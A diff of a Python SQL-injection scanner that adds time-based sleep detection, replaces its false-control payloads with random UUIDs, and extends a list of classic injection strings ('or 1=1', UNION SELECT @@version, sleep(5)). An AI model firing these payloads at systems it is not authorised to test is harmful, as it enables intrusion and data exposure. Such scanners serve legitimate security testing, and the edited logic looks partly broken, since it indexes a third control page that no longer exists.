@@ -17,8 +17,8 @@ singel quote and double quote is not fixed yet.
 
 def get_false():
 	## the second is taken as ground truth to filter out real sql-injection page
-	# payloads = ["' and '1=2", "' or '1'='1", '" or "1"="1']
-	payloads = ["' and '1=2",'" or "1"="1', "' or '1'='1"]
+	# payloads = ["' and '1=2",'" or "1"="1', "' or '1'='1"]
+	payloads = [str(uuid.uuid4()), str(uuid.uuid4())]
 	return payloads
 
 def get_falsewy():
@@ -30,12 +30,12 @@ def checkSuccesswy(content,url,method,paramname,params,payload):
 
 	if len(content.history) !=0 :
 		return False
-   	#if get
+	#if get
 	if method == "GET":
 		paramstr = "&".join("%s=%s" % (k,v) for k,v in params.items())
 		getURL = url + "?" + paramstr
 		falseContent = requests.get(getURL)
-#if post
+	#if post
 	elif method == "POST":
 		falseContent = requests.post(url, data=params)
 
@@ -48,47 +48,53 @@ def checkSuccesswy(content,url,method,paramname,params,payload):
 	return True
 
 
-def check_success_zz(content,method,paramname):
-	## for real sql injection, the payloads should return the same result
-## then compare the fake page with the true page to see the difference
-	falsePayloads = get_false()
-#if get
-	html = content.html
-	badhtml = []
-	for falsePayload in falsePayloads:
-		if method == "GET":
-			getURL = url + "?" + paramname+"="+falsePayload
-			false_page = requests.get(getURL)
-			if(false_page.status_code==200):
-				badhtml.append(false_page.text)
+def check_success_zz(content,url,method,paramname,params,payload):
+	## experimental for sleep function
+	if 'sleep' in payload[0] and content.elapsed.total_seconds() > 5:
+		print("This page is highly suspecious to sql injection...")
+		return True
+
+	else:
+		## for real sql injection, the payloads should return the same result
+		## then compare the fake page with the true page to see the difference
+		## need to check false positive page 
+		falsePayloads = get_false()
+		html = content.html
+		badhtml = []
+		for falsePayload in falsePayloads:
+			if method == "GET":
+				getURL = url + "?" + paramname+"="+falsePayload
+				false_page = requests.get(getURL)
+				if(false_page.status_code==200):
+					badhtml.append(false_page.text)
+				else:
+					badhtml.append(requests.get(url).text)
+			elif method == "POST":
+				false_page = requests.post(url, data={paramname:falsePayload})
+				if(false_page.status_code==200):
+					badhtml.append(false_page.text)
+					# print(html)
 			else:
 				badhtml.append(requests.get(url).text)
-#if post
-		elif method == "POST":
-			false_page = requests.post(url, data={paramname:falsePayload})
-			if(false_page.status_code==200):
-				badhtml.append(false_page.text)
-				# print(html)
-		else:
-			badhtml.append(requests.get(url).text)
 
-	if (badhtml[0] == badhtml[1]) and (badhtml[0] !=badhtml[2]):
-	## true filter should be two
-		compare_res = compare_html(badhtml[2], html)  
-		match = re.findall(r'<ins>.+', compare_res)
-	elif(badhtml[0]==badhtml[2] and badhtml[0] !=badhtml[1]):
-		compare_res = compare_html(badhtml[1], html)  
-		match = re.findall(r'<ins>.+', compare_res)
-	else:
-		match = ""
-	if(content.status_code==200) and badhtml[1]==html:
-		compare_res = compare_html(badhtml[0], html)  
-		match = re.findall(r'<ins>.+', compare_res)
-	else:
-		match = ""
-	if len(match) ==0 :
-		return False
-	return True
+		if (badhtml[0] == badhtml[1]) and (badhtml[0] !=badhtml[2]):
+		## true filter should be two
+			compare_res = compare_html(badhtml[2], html)  
+			match = re.findall(r'<ins>.+', compare_res)
+		elif(badhtml[0]==badhtml[2] and badhtml[0] !=badhtml[1]):
+			compare_res = compare_html(badhtml[1], html)  
+			match = re.findall(r'<ins>.+', compare_res)
+		else:
+			match = ""
+		if(content.status_code==200) and badhtml[1]==html:
+			compare_res = compare_html(badhtml[0], html)  
+			match = re.findall(r'<ins>', compare_res)
+		else:
+			match = ""
+		if len(match) ==0 :
+			return False
+		
+		return True
 
 
 def get_all():
@@ -107,6 +113,7 @@ def get_all():
 	# payloads = ["' or '1=1"]
 	payloads = ["' or '1=1",   "'1 'or' 1'='1","' or '1'='1",  "'or 1=1#", 
 				"' OR '1=1 %00", '" or "1=1', "' union all select @@version, 1, 1 -- +", 
+				"' union all select @@version -- +","'union all select @@version, 1 -- +",
 				"' or sleep(5);--"]
 	payloads = [(item, "SQL Injection") for item in payloads]
 	return payloads	
